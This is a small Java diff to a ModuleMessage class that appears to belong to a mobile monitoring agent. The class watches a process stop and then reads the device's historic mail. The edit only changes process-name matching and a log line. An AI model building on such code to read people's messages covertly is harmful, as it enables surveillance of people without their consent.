@@ -198,11 +198,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): " + process);
 			}
-			if (process.processInfo.processName.contains(pObserving)) {
+			if (process.processInfo.contains(pObserving)) {
 				if (process.status == ProcessStatus.STOP) {
 					try {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+							Check.log(TAG + " (notification), observing found: " + process.processInfo);
 						}
 						readHistoricMail(lastMail);
 					} catch (IOException e) {
